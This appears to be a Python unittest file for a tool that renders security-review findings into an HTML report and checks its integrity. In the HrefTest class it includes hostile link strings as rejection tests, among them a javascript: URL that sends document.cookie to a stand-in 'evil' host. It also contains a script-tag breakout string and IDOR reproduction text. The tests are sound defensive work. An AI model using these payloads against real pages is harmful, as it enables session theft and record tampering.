        self.assertEqual([g["unit_id"] for g in data["chain_graphs"]],
                         ["UserController_list"])
        g = data["chain_graphs"][0]
        # layout: main line depth = position; branch node one below its host; viewBox
        # spans all nodes
        self.assertEqual(len(g["nodes"]), 4)
        self.assertEqual(len(g["edges"]), 3)
        by_id = {n["id"]: n for n in g["nodes"]}
        self.assertLess(by_id[0]["x"], by_id[1]["x"])
        self.assertEqual(by_id[3]["x"], by_id[2]["x"])     # depth(host)+1 = host's next column
        self.assertGreater(by_id[3]["y"], by_id[2]["y"])   # own row, no overlap
        # dashed edge into the unchanged? no — dashed only for external terminals; the
        # branch edge here is a normal java fan-out edge
        self.assertEqual([e["dashed"] for e in g["edges"]], [False, False, False])
        # † prefix survives into the graph label (after the entry's route prefix);
        # hover title = file:line
        self.assertEqual(by_id[0]["label"], "/user/list †UserController.list")
        self.assertEqual(by_id[0]["title"],
                         "src/main/java/com/x/controller/UserController.java:12")
        self.assertGreater(g["width"], 0)
        self.assertGreater(g["height"], 0)

    def test_svg_dashed_mapper_terminal_edge(self):
        # a REAL branch whose subtree ends in a mapper terminal: terminal edge is dashed
        branched = list(self.CHAIN_A) + [
            {"fqn_short": "AuditDao.log", "label": "AuditDao.log",
             "file": "src/main/java/com/x/dao/AuditDao.java", "line": 9,
             "change": "changed", "branch_of": 1},
            {"fqn_short": "AuditMapper.xml", "label": "AuditMapper.xml:log",
             "file": "src/main/resources/mapper/AuditMapper.xml", "line": None,
             "change": "external", "branch_of": 4},
        ]
        self._grouping([
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": branched, "status": "done"},
        ])
        _, _, data, _ = self._render()
        self.assertEqual(len(data["chain_graphs"]), 1)
        g = data["chain_graphs"][0]
        by_id = {n["id"]: n for n in g["nodes"]}
        self.assertEqual(len(g["nodes"]), 6)
        dashed = [e for e in g["edges"] if e["dashed"]]
        self.assertEqual(len(dashed), 2)   # the ⇢ terminal on the main line + branch's ⇢
        for e in dashed:
            self.assertEqual(by_id[e["dst"]]["terminal"], True)
        self.assertFalse(by_id[5]["terminal"] and by_id[4]["terminal"])

    # --- 章节二 findings line / degrade -------------------------------------------

    def test_detail_findings_line_and_degrade(self):
        # draft WITH line -> file:line + #L anchor; draft WITHOUT line -> file(hint)
        # plain (old-draft compatible; never a hard failure)
        self._grouping([
            {"unit_id": "u1", "kind": "interface", "route": "/order/submit",
             "chain": [], "status": "done"},
        ])
        self._draft("u1", [{
            "dimension": "input-validation", "severity": "low", "route": "/order/submit",
            "file": "OrderVO.java", "line_hint": "9-14", "line": 11, "risk": "r",
            "suggestion": "s", "control_ref": None}, {
            "dimension": "sensitive-data", "severity": "info", "route": "/order/submit",
            "file": "OldVO.java", "line_hint": "3-5", "risk": "r2",
            "suggestion": "s2", "control_ref": "掩码规约"}])
        _, _, data, _ = self._render()
        f1, f2 = data["findings"]
        self.assertEqual(f1["pnum"], "P-01")
        self.assertEqual((f1["dimension_label"], f1["severity_label"]),
                         ("输入校验", "低"))
        self.assertEqual(f1["loc"]["text"], "OrderVO.java:11")
        self.assertEqual(f1["loc"]["href"], "OrderVO.java#L11")
        self.assertEqual(f2["loc"]["text"], "OldVO.java(3-5)")
        self.assertEqual(f2["loc"]["href"], "OldVO.java")   # no anchor on degrade

    # --- 复现方式 / 修复对比 + 可读性束与自检小节 ----------------------------------

    def test_repro_and_fix_diff_rendered_and_in_data(self):
        # draft carrying repro + fix_diff -> the P-NN card renders 复现方式 line and a
        # 修改前/修改后 <pre> stack (textContent route); the data file carries both
        # fields; the two carriers stay JSON-equivalent; hostile chars in the diff body
        # cannot break the embed (same </-escape path as risk text)
        self._draft("u1", [{
            "dimension": "horizontal-authz", "severity": "high", "route": "/user/del",
            "file": "UserController.java", "line_hint": "60-64", "line": 62,
            "risk": "删除接口未校验记录归属。",
            "suggestion": "删除前校验记录归属。",
            "repro": "以任一有效登录会话 POST /user/del 传他人 id → 他人记录被删除。",
            "fix_diff": [{"before": "userDao.deleteById(<b>id</b>);</script>",
                          "after": "userDao.deleteByIdAndOwner(id, currentUser.id);"}],
            "control_ref": None}])
        _, report, data, _ = self._render()
        f = data["findings"][0]
        self.assertEqual(f["repro"],
                         "以任一有效登录会话 POST /user/del 传他人 id → 他人记录被删除。")
        self.assertEqual(f["fix_diff"],
                         [{"before": "userDao.deleteById(<b>id</b>);</script>",
                           "after": "userDao.deleteByIdAndOwner(id, currentUser.id);"}])
        self.assertEqual(_embed(self.m, report), data)
        # the page JS carries the two display blocks (label + verbatim <pre> injection)
        self.assertIn("复现方式:", report)
        self.assertIn("修改前", report)
        self.assertIn("修改后", report)
        self.assertIn('createElement("pre")', report)
        self.assertIn('preB.textContent', report)
        self.assertIn('preA.textContent', report)
        # hostile body escaped in the embed; page JS stays alive (2 real terminators)
        self.assertIn("<\\/script>", report)
        self.assertEqual(report.count("</script>"), 2)

    def test_fix_diff_malformed_pairs_degrade(self):
        # malformed pairs are dropped (not a crash); cap at 2 well-formed pairs;
        # whitespace-only repro degrades to absent
        self._draft("u1", [{
            "dimension": "input-validation", "severity": "low", "route": "/u/x",
            "file": "X.java", "line_hint": "1", "risk": "r", "suggestion": "s",
            "repro": "   ",
            "fix_diff": ["not-a-dict", {"before": "x"}, {"before": "a", "after": ""},
                         {"before": "ok", "after": "fine"},
                         {"before": "two", "after": "also"}],
            "control_ref": None}])
        _, _, data, _ = self._render()
        f = data["findings"][0]
        self.assertNotIn("repro", f)
        self.assertEqual(f["fix_diff"], [{"before": "ok", "after": "fine"},
                                         {"before": "two", "after": "also"}])

    def test_repro_filled_from_duplicate(self):
        # same-triple duplicate across units: risk/suggestion stay first-writer-wins,
        # repro/fix_diff fall back to the first duplicate that carries them
        self._draft("u1", [{"dimension": "horizontal-authz", "severity": "high",
                            "route": "/user/detail", "file": "UserController.java",
                            "line_hint": "88-102", "risk": "r1", "suggestion": "s1",
                            "control_ref": None}])
        self._draft("u2", [{"dimension": "horizontal-authz", "severity": "medium",
                            "route": "/user/detail", "file": "UserController.java",
                            "line_hint": "110", "risk": "dup", "suggestion": "-",
                            "repro": "登录后调 GET /user/detail?brch_no=他人分支 → 返回他人数据",
                            "control_ref": None}])
        _, _, data, _ = self._render()
        self.assertEqual(len(data["findings"]), 1)
        self.assertEqual(data["findings"][0]["risk"], "r1")
        self.assertEqual(data["findings"][0]["repro"],
                         "登录后调 GET /user/detail?brch_no=他人分支 → 返回他人数据")

    def test_old_draft_without_new_fields_renders_clean(self):
        # 1.8 compat guard (green by construction, kept to catch implementation-time
        # regressions): old drafts without repro/fix_diff -> no display, render and
        # --check both fine
        self._draft("u1", [self.F1])
        payload, report, data, _ = self._render()
        self.assertNotIn("repro", data["findings"][0])
        self.assertNotIn("fix_diff", data["findings"][0])
        self.assertEqual(_embed(self.m, report), data)
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_check_vocab_hit_warns_without_exit_change(self):
        # 1.4: model text hitting the closed set -> stderr count warning (field name +
        # term), exit code unchanged, text preserved verbatim
        self._draft("u1", [{
            "dimension": "sql-injection", "severity": "high", "route": "/user/list",
            "file": "UserDao.java", "line_hint": "40", "risk": "该切片存在基线投影遗漏。",
            "suggestion": "参考存量 hunk 改写。",
            "repro": "检查面上重放即可", "control_ref": None}])
        code, out, err = self._run("--run-dir", str(self.run_dir), "--repo",
                                   str(self.repo))
        self.assertEqual(code, 0, err)
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)          # soft quality: exit code unchanged
        self.assertIn("risk", err)
        self.assertIn("投影", err)
        self.assertIn("suggestion", err)
        self.assertIn("hunk", err)
        self.assertIn("repro", err)
        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        self.assertEqual(data["findings"][0]["risk"], "该切片存在基线投影遗漏。")

    def test_check_vocab_clean_no_warning(self):
        # the clean counterpart: zero closed-set hits -> zero vocabulary warnings
        self._draft("u1", [{"dimension": "input-validation", "severity": "low",
                            "route": "/u/clean", "file": "C.java", "line_hint": "1",
                            "risk": "干净文本。", "suggestion": "无需处理。",
                            "control_ref": None}])
        self._render()
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)
        self.assertNotIn("内部词闭集", err)

    def test_text_bundle_written_on_render(self):
        # 1.7: every render writes the readability text bundle (one item per merged
        # finding, human-face fields only)
        self._draft("u1", [{
            "dimension": "horizontal-authz", "severity": "high", "route": "/user/del",
            "file": "UserController.java", "line_hint": "60-64", "line": 62,
            "risk": "删除接口未校验记录归属。", "suggestion": "删除前校验记录归属。",
            "repro": "以任一有效登录会话 POST /user/del 传他人 id → 他人记录被删除。",
            "fix_diff": [{"before": "a", "after": "b"}], "control_ref": None}])
        self._draft("u2", [{
            "dimension": "sql-injection", "severity": "medium", "route": "/user/list",
            "file": "UserDao.java", "line_hint": "40", "risk": "拼接 SQL。",
            "suggestion": "改参数化。", "control_ref": None}])
        self._render()
        bundle = json.loads((self.run_dir / "readability_text_bundle.json").read_text(
            encoding="utf-8"))
        self.assertEqual(bundle["v"], 1)
        self.assertEqual(len(bundle["items"]), 2)
        by_p = {i["pnum"]: i for i in bundle["items"]}
        self.assertEqual(by_p["P-01"]["repro"],
                         "以任一有效登录会话 POST /user/del 传他人 id → 他人记录被删除。")
        self.assertEqual(by_p["P-01"]["fix_diff"], [{"before": "a", "after": "b"}])
        self.assertEqual(by_p["P-02"]["risk"], "拼接 SQL。")
        self.assertNotIn("fix_diff", by_p["P-02"])
        # idempotent: a second render rewrites the same bundle cleanly
        self._render()
        bundle2 = json.loads((self.run_dir / "readability_text_bundle.json").read_text(
            encoding="utf-8"))
        self.assertEqual(bundle2, bundle)

    def test_advisories_consumed_into_data_and_section(self):
        # 1.7: parsable advisories file -> data gains readability[], report gains the
        # default-collapsed 可读性自检 section, exit code unchanged, carriers equal
        self._draft("u1", [self.F1])
        self._render()
        (self.run_dir / "readability_advisories.json").write_text(json.dumps({
            "v": 1, "advisories": [
                {"term": "落库链路", "field": "risk", "pnum": "P-01",
                 "why": "一两年经验读者不懂这个内部词"}]}, ensure_ascii=False),
            encoding="utf-8")
        _, report, data, _ = self._render()
        self.assertEqual(data["readability"],
                         [{"term": "落库链路", "field": "risk", "pnum": "P-01",
                           "why": "一两年经验读者不懂这个内部词"}])
        self.assertEqual(_embed(self.m, report), data)
        self.assertIn("可读性自检", report)
        self.assertIn("落库链路", report)          # rides the embedded data block
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_advisories_absent_omits_section(self):
        # 1.7: no advisory file -> no readability field, no section, exit code unchanged
        self._draft("u1", [self.F1])
        _, report, data, _ = self._render()
        self.assertNotIn("readability", data)
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)

    def test_advisories_unparsable_omits_with_note(self):
        self._draft("u1", [self.F1])
        self._render()
        (self.run_dir / "readability_advisories.json").write_text("{not json",
                                                                  encoding="utf-8")
        code, out, err = self._run("--run-dir", str(self.run_dir), "--repo",
                                   str(self.repo))
        self.assertEqual(code, 0, err)
        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        self.assertNotIn("readability", data)
        self.assertIn("unparsable", err)

    def test_advisories_empty_list_omits_section(self):
        # an empty advisory list is a valid honest outcome — nothing to show, section
        # and field omitted
        self._draft("u1", [self.F1])
        self._render()
        (self.run_dir / "readability_advisories.json").write_text(
            '{"v": 1, "advisories": []}', encoding="utf-8")
        _, _, data, _ = self._render()
        self.assertNotIn("readability", data)

    def test_advisories_malformed_shape_omits(self):
        self._draft("u1", [self.F1])
        self._render()
        (self.run_dir / "readability_advisories.json").write_text('{"v": 1}',
                                                                  encoding="utf-8")
        code, _, err = self._run("--run-dir", str(self.run_dir), "--repo",
                                 str(self.repo))
        self.assertEqual(code, 0, err)
        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        self.assertNotIn("readability", data)

    # --- manifest rows projection + --check ----------------------------------------

    def test_rows_projection_consistency_and_check(self):
        self._grouping([
            {"unit_id": "OrderController_submit", "kind": "interface",
             "route": "/order/submit", "chain": self.CHAIN_A, "status": "done"},
        ])
        self._draft("OrderController_submit", [{
            "dimension": "vertical-authz", "severity": "high", "route": "/order/submit",
            "file": "OrderController.java", "line_hint": "42", "line": 42, "risk": "r",
            "suggestion": "s", "control_ref": None}])
        _, _, data, manifest = self._render()
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)
        # tamper: drop manifest rows -> manifest rows != data rows -> exit 2
        mp = self.run_dir / "sdr_manifest.json"
        m = json.loads(mp.read_text(encoding="utf-8"))
        m["rows"] = []
        mp.write_text(json.dumps(m, ensure_ascii=False), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("rows[]", err)

    def test_check_ok_and_counts_mismatch(self):
        self._draft("u1", [self.F1])
        self._render()
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 0, err)
        # tamper with the manifest count -> --check exit 2
        mp = self.run_dir / "sdr_manifest.json"
        m = json.loads(mp.read_text(encoding="utf-8"))
        m["counts"]["findings"] = 99
        mp.write_text(json.dumps(m, ensure_ascii=False), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("mismatch", err)

    def test_check_data_file_tamper_is_carrier_drift(self):
        self._draft("u1", [self.F1])
        self._render()
        dp = self.run_dir / "sdr_report_data.json"
        d = json.loads(dp.read_text(encoding="utf-8"))
        d["boundaries"].append("人为篡改")
        dp.write_text(json.dumps(d, ensure_ascii=False), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("carrier drift", err)

    def test_check_embed_block_tamper_is_carrier_drift(self):
        self._draft("u1", [self.F1])
        payload, _, _, _ = self._render()
        rp = Path(payload["report"])
        html = rp.read_text(encoding="utf-8")
        self.assertIn('"v": 1', html)
        rp.write_text(html.replace('"v": 1', '"v": 2', 1), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("carrier drift", err)

    def test_check_missing_data_file(self):
        self._draft("u1", [self.F1])
        self._render()
        (self.run_dir / "sdr_report_data.json").unlink()
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("sdr_report_data.json missing", err)

    def test_check_missing_section_marker(self):
        self._draft("u1", [self.F1])
        payload, _, _, _ = self._render()
        rp = Path(payload["report"])
        rp.write_text(rp.read_text(encoding="utf-8")
                      .replace(' id="sec-boundaries"', "", 1), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn('id="sec-boundaries"', err)

    def test_check_rejects_non_html_report(self):
        self._draft("u1", [self.F1])
        payload, _, _, _ = self._render()
        mp = self.run_dir / "sdr_manifest.json"
        m = json.loads(mp.read_text(encoding="utf-8"))
        fake = self.repo / "mgh-sdr-feature-pay-old.md"
        fake.write_text("# old md report\n诚实边界\n", encoding="utf-8")
        m["report"] = str(fake)
        mp.write_text(json.dumps(m, ensure_ascii=False), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("not a .html", err)

    def test_check_rejects_report_outside_repo_root(self):
        # L8: the old "manifest must be in run dir" guard was structurally always
        # false (the path was BUILT as run_dir / "sdr_manifest.json"). The real
        # product promise is that the report lives at the repo root — a manifest
        # pointing elsewhere is tampering/misuse and must fail loudly.
        self._draft("u1", [self.F1])
        payload, _, _, _ = self._render()
        outside = self.tmp / "elsewhere.html"          # sibling of the repo dir
        outside.write_text(Path(payload["report"]).read_text(encoding="utf-8"),
                           encoding="utf-8")
        mp = self.run_dir / "sdr_manifest.json"
        m = json.loads(mp.read_text(encoding="utf-8"))
        m["report"] = str(outside)
        mp.write_text(json.dumps(m, ensure_ascii=False), encoding="utf-8")
        code, _, err = self._run("--check", str(self.run_dir))
        self.assertEqual(code, 2)
        self.assertIn("repo root", err)

    def test_missing_run_dir_exits_1(self):
        code, _, _ = self._run("--run-dir", str(self.tmp / "nope"), "--repo",
                               str(self.repo))
        self.assertEqual(code, 1)


class HrefTest(unittest.TestCase):
    """_href_of unit behaviour: the lexical link rules and every degradation."""

    def setUp(self):
        self.m = _load()
        self.repo = Path(os.path.normcase("C:/dev/repo"))

    def _href(self, file, line=None, repo=None):
        return self.m._href_of(file, line, repo or self.repo)

    def test_relative_path_with_line(self):
        self.assertEqual(self._href("src/main/java/Ctl.java", 42),
                         "src/main/java/Ctl.java#L42")

    def test_no_line_anchor_omitted(self):
        self.assertEqual(self._href("src/mapper/M.xml", None), "src/mapper/M.xml")

    def test_outside_repo_absolute_stays_plain(self):
        self.assertIsNone(self._href("C:/other/place/F.java", 3))
        self.assertIsNone(self._href("D:/dev/repo/F.java", 3))   # other drive

    def test_inside_repo_absolute_case_insensitive_drive(self):
        self.assertEqual(self._href("c:/DEV/repo/src/F.java", 7), "src/F.java#L7")

    def test_empty_and_missing_stay_plain(self):
        for f in ("", "   ", None, 42, ["a"]):
            self.assertIsNone(self._href(f, 1))

    def test_space_and_paren_paths_stay_plain(self):
        self.assertIsNone(self._href("src/my dir/F.java", 1))
        self.assertIsNone(self._href("src/f(1).java", 1))

    def test_backslash_relative_normalized_to_slash(self):
        self.assertEqual(self._href("src\\main\\F.java", 1), "src/main/F.java#L1")

    def test_parent_escape_stays_plain(self):
        self.assertIsNone(self._href("../outside/F.java", 1))
        self.assertIsNone(self._href("src/../../outside/F.java", 1))

    def test_scheme_payload_stays_plain(self):
        # C3: `javascript:` with no spaces/parens sailed through every pre-existing
        # degrade rule into <a href> — the colon check must kill it
        self.assertIsNone(self._href(
            "javascript:location=`https:/evil/${document.cookie}`", 1))
        # double-slash form: normpath folds `//` to `/` and WHATWG URL parsing
        # tolerates a single slash for special schemes, so the check runs again on
        # the FINAL normalized rel (folding must not revive the payload)
        self.assertIsNone(self._href("javascript://evil.com/payload", 1))
        self.assertIsNone(self._href("vbscript:x", 1))

    def test_drive_relative_stays_plain(self):
        # C:foo matches neither _ABS_DRIVE (needs a separator after the colon) nor the
        # old relative rules — it used to become a broken <a href>
        self.assertIsNone(self._href("C:foo", 1))
        self.assertIsNone(self._href("C:Windows/evil.java", 3))

    def test_bool_line_is_not_an_anchor(self):
        self.assertEqual(self._href("src/F.java", True), "src/F.java")

    def test_posix_absolute_inside_repo(self):
        if os.name == "nt":
            self.skipTest("POSIX-absolute semantics only exist off Windows")
        self.assertEqual(self._href("/repo/src/F.java", 2, Path("/repo")),
                         "src/F.java#L2")


class ChainSegmentsTest(unittest.TestCase):
    """row_links segments are the SAME walk as the plain-text chain: de-linkified join
    reproduces _render_chain byte-for-byte (manifest rows stay the machine truth)."""

    def setUp(self):
        self.m = _load()
        self.repo = Path(os.path.normcase("C:/dev/repo"))

    def test_branched_chain_join_equals_plain_text(self):
        chain = [
            {"fqn_short": "Ctl.submit", "file": "src/Ctl.java", "line": 10,
             "change": "changed", "route": "/order/submit"},
            {"fqn_short": "Svc.submit", "file": "src/Svc.java", "line": 20,
             "change": "changed"},
            {"fqn_short": "Svc.helper", "file": "src/Svc.java", "line": 25,
             "change": "changed"},
            {"fqn_short": "Dao.ins", "file": "src/Dao.java", "line": 30,
             "change": "changed"},
            {"fqn_short": "DaoMapper.xml", "file": "src/mapper/D.xml", "line": None,
             "change": "external", "branch_of": 3},
            {"fqn_short": "†Shell.run", "file": "src/Shell.java", "line": 5,
             "change": "unchanged", "branch_of": 0},
        ]
        segs = self.m._chain_segments(chain, self.repo)
        plain = self.m._render_chain(chain)
        self.assertEqual("".join(s["sep"] + s["text"] for s in segs), plain)
        # separators never ride the href; † stays inside the text
        self.assertEqual(segs[0]["href"], "src/Ctl.java#L10")
        self.assertEqual(segs[4]["sep"], " ⇢")
        self.assertEqual(segs[5]["sep"], " ⤷")
        self.assertEqual(segs[2]["sep"], " ·")   # same-class continuation
        self.assertEqual(segs[2]["href"], "src/Svc.java#L25")
        for s in segs:
            self.assertNotIn(s["href"] or "", s["sep"])

    def test_empty_chain_gives_no_segments(self):
        self.assertEqual(self.m._chain_segments([], self.repo), [])


class DeterministicCopyVocabGuardTest(unittest.TestCase):
    """1.1 禁词守卫:渲染器全部确定性人类面文案零闭集词(核心 + sdr 域,与词表模块
    import 同一单源)。覆盖:_boundaries 全变体、分组概览与诊断明细、一次代表性渲染的
    全部确定性字段 + 静态 HTML 模板、维度/severity 标签常量。确定性文案命中闭集 =
    实现缺陷,测试 fail(全量提取扫描,漏改即红)。模型文本不在本守卫面(那是 --check
    的告警面,另测)。"""

    def setUp(self):
        self.m = _load()
        self.v = _load_vocab()

    def _scan(self, texts):
        hits = []
        for t in texts:
            for term in self.v.scan_text(t, domains=("sdr",)):
                if term not in hits:
                    hits.append(term)
        return hits

    def test_boundary_variants_clean(self):
        failed = [{"unit": "u9", "reason": "path-drift"}]
        excluded = {"count": 120, "by_reason": {"test-tree": 80, "build-output": 30}}
        skipped = ["unapproved: D:/x/front", "not-found: D:/y/gone"]
        for catalog in ("project", "default-template"):
            bs = self.m._boundaries({}, failed, catalog,
                                    [{"slug": "front", "path": "D:/f"}],
                                    ["sql-injection"], True, excluded, skipped, ["u3"])
            self.assertEqual(self._scan(bs), [],
                             f"boundary copy hit closed set (catalog={catalog})")
        bs = self.m._boundaries({}, [], "project", [], None, False, None, None, None)
        self.assertEqual(self._scan(bs), [])

    def test_overview_and_details_clean(self):
        grouping = {"codegraph": True, "total": 8,
                    "counts": {"interface": 6, "standalone": 2},
                    "codegraph_stats": {"symbols_queried": 30, "edges_captured": 107,
                                        "edges_in_changed_set": 80, "anchors_changed": 4,
                                        "anchors_upstream": 2, "chain_merged": 1}}
        excluded = {"count": 120, "by_reason": {"test-tree": 120}}
        overview, details = self.m._overview_and_details(grouping, excluded,
                                                         grouping["codegraph_stats"])
        self.assertEqual(self._scan([o["k"] + ":" + o["v"] for o in overview] + details),
                         [])
        # codegraph-off branch
        overview2, details2 = self.m._overview_and_details(
            {"codegraph": False, "total": 1, "counts": {"interface": 0, "standalone": 1}},
            None, {})
        self.assertEqual(self._scan([o["k"] + ":" + o["v"] for o in overview2] + details2),
                         [])

    def test_full_render_deterministic_copy_clean(self):
        # end-to-end: a representative render; every deterministic string the data
        # carries (head labels, headline, catalog note, overview, boundaries, label
        # constants) + the static HTML template must be closed-set free
        tmp = Path(tempfile.mkdtemp(prefix="mgh_sdrguard_"))
        try:
            repo = tmp / "repo"
            repo.mkdir()
            run_dir = repo / ".mgh-sdr" / "runs" / "t1"
            (run_dir / "markers").mkdir(parents=True)
            (run_dir / "drafts").mkdir(parents=True)
            (run_dir / "context.json").write_text(json.dumps({
                "branch": "feature-pay", "base": "master", "dimensions": None,
                "sensitive_catalog_source": "default-template",
                "external_repos": [{"slug": "front", "path": "D:/f", "route_hits": []}],
                "external_skipped": ["unapproved: D:/x/front"],
                "pending_approval": ["D:\\x\\front"],
                "baseline_truncated": False,
            }, ensure_ascii=False), encoding="utf-8")
            (run_dir / "grouping.json").write_text(json.dumps({
                "repo": str(repo), "base": "master", "branch": "feature-pay",
                "empty": False, "codegraph": True, "total": 8,
                "counts": {"interface": 6, "standalone": 2},
                "excluded": {"count": 120, "by_reason": {"test-tree": 120}},
                "codegraph_stats": {"symbols_queried": 30, "edges_captured": 107,
                                    "edges_in_changed_set": 80, "anchors_changed": 4,
                                    "anchors_upstream": 2, "chain_merged": 1},
                "units": [], "pending": [],
            }, ensure_ascii=False), encoding="utf-8")
            (run_dir / "drafts" / "u1.json").write_text(json.dumps(
                {"unit": "u1", "findings": [
                    {"dimension": "horizontal-authz", "severity": "high",
                     "route": "/user/del", "file": "UserController.java",
                     "line_hint": "60-64", "line": 62,
                     "risk": "以任一有效登录会话 POST /user/del 传他人 id,"
                             "他人记录会被删除。",
                     "suggestion": "删除前校验记录归属(会话用户 vs 记录所有者)。",
                     "control_ref": None}]}, ensure_ascii=False), encoding="utf-8")
            (run_dir / "markers" / "u1.done").write_text("{}", encoding="utf-8")
            sys.argv = ["render_sdr_report.py", "--run-dir", str(run_dir),
                        "--repo", str(repo)]
            out, err = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                code = self.m.main()
            self.assertEqual(code, 0, err.getvalue())
            data = json.loads((run_dir / "sdr_report_data.json").read_text(
                encoding="utf-8"))
            meta = data["meta"]
            surfaces = list(data["boundaries"]) + [meta["external_headline"],
                                                   meta["catalog_note"]]
            surfaces += [o["k"] + ":" + o["v"] for o in meta["overview"]]
            surfaces += list(meta.get("overview_details") or [])
            surfaces += list(self.m._DIMENSION_LABEL.values()) \
                + list(self.m._DIMENSION_COL.values()) \
                + list(self.m._SEVERITY_LABEL.values())
            surfaces.append(self.m._HTML_TEMPLATE)
            hits = self._scan(surfaces)
            self.assertEqual(hits, [],
                             f"deterministic report copy hit closed set: {hits}")
        finally:
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)


class DispatchDisclosureTest(unittest.TestCase):
    """fix-mgh-sdr-native-dispatch: the dispatch-form disclosure rides a
    CONJUNCTIVE basis (native_plan.json in the run dir AND the repo profile
    explicitly native). Any non-native run keeps byte-identical carriers (no
    `dispatch` key anywhere); a native run adds meta.dispatch + manifest.dispatch
    + one head-meta line + exactly one extra honesty-boundary entry, with the
    canonical review data (rows/findings/counts) unchanged — the dual-form
    same-data diff below asserts the disclosure is the ONLY delta."""

    F1 = {"dimension": "horizontal-authz", "severity": "high", "route": "/user/detail",
          "file": "UserController.java", "line_hint": "88-102", "risk": "风险一",
          "suggestion": "建议一", "control_ref": "横向越权规约"}

    def setUp(self):
        self.m = _load()
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def _build(self, native):
        repo = self.tmp / ("native" if native else "plain")
        run_dir = repo / ".mgh-sdr" / "runs" / "t1"
        (run_dir / "markers").mkdir(parents=True)
        (run_dir / "drafts").mkdir(parents=True)
        (run_dir / "context.json").write_text(json.dumps({
            "branch": "feature-pay", "base": "master", "dimensions": None,
            "sensitive_catalog_source": "default-template", "external_repos": [],
            "baseline_truncated": False,
        }), encoding="utf-8")
        (run_dir / "drafts" / "u1.json").write_text(json.dumps(
            {"unit": "u1", "findings": [dict(self.F1)]}, ensure_ascii=False),
            encoding="utf-8")
        (run_dir / "markers" / "u1.done").write_text("{}", encoding="utf-8")
        if native:
            (run_dir / "native_plan.json").write_text("{}", encoding="utf-8")
            (repo / ".mgh").mkdir(parents=True)
            (repo / ".mgh" / "env-profile.json").write_text(json.dumps(
                {"v": 1, "dispatch_mode": "native"}), encoding="utf-8")
        return repo, run_dir

    @staticmethod
    def _render_call(mod, *args):
        sys.argv = ["render_sdr_report.py"] + list(args)
        out, err = io.StringIO(), io.StringIO()
        code = None
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = mod.main()
            except SystemExit as e:
                code = e.code
        return code, out.getvalue(), err.getvalue()

    def _render(self, repo, run_dir):
        code, out, err = self._render_call(
            self.m, "--run-dir", str(run_dir), "--repo", str(repo))
        self.assertEqual(code, 0, err)
        data = json.loads((run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        manifest = json.loads((run_dir / "sdr_manifest.json").read_text(
            encoding="utf-8"))
        report = Path(json.loads(out)["report"]).read_text(encoding="utf-8")
        return data, manifest, report

    def test_subprocess_run_has_no_disclosure_fields(self):
        repo, run_dir = self._build(native=False)
        data, manifest, report = self._render(repo, run_dir)
        self.assertNotIn("dispatch", data["meta"])
        self.assertNotIn("dispatch", manifest)
        # the head-meta conditional exists once (JS shape); the embedded data
        # carries no dispatch object, so the rendered line never appears
        self.assertEqual(report.count("if (m.dispatch)"), 1)
        self.assertNotIn("dispatch", _embed(self.m, report)["meta"])

    def test_plan_without_profile_or_bad_profile_stays_silent(self):
        repo, run_dir = self._build(native=False)
        (run_dir / "native_plan.json").write_text("{}", encoding="utf-8")
        data, manifest, report = self._render(repo, run_dir)
        self.assertNotIn("dispatch", _embed(self.m, report)["meta"])
        self.assertNotIn("dispatch", data["meta"])
        # corrupt profile: report-reader degrades to no disclosure
        (repo / ".mgh").mkdir(parents=True, exist_ok=True)
        (repo / ".mgh" / "env-profile.json").write_text("{broken", encoding="utf-8")
        data2, manifest2, _ = self._render(repo, run_dir)
        self.assertNotIn("dispatch", data2["meta"])
        self.assertNotIn("dispatch", manifest2)

    def test_native_run_discloses_form_and_boundaries(self):
        repo, run_dir = self._build(native=True)
        data, manifest, report = self._render(repo, run_dir)
        d = data["meta"]["dispatch"]
        self.assertEqual(d["form"], "native")
        self.assertTrue(Path(d["plan_artifact"]).is_absolute())
        self.assertIn("native_plan.json", d["evidence"])
        self.assertEqual(manifest["dispatch"]["form"], "native")
        # the head-meta data (rendered by JS in a browser) carries the line's payload
        self.assertEqual(_embed(self.m, report)["meta"]["dispatch"]["form"], "native")
        joined = "\n".join(data["boundaries"])
        for needle in ("波次粒度", "父会话是单点", "残余错抄面"):
            self.assertIn(needle, joined, needle)

    def test_dual_form_same_data_diff_is_disclosure_only(self):
        plain_repo, plain_run = self._build(native=False)
        nat_repo, nat_run = self._build(native=True)
        pdata, pmanifest, _ = self._render(plain_repo, plain_run)
        ndata, nmanifest, _ = self._render(nat_repo, nat_run)
        # time-stamped fields drift between renders; everything canonical must not
        for d in (pdata, ndata):
            d["meta"].pop("ts"), d["meta"].pop("time_display")
        self.assertEqual(pdata["rows"], ndata["rows"])
        self.assertEqual(pdata["findings"], ndata["findings"])
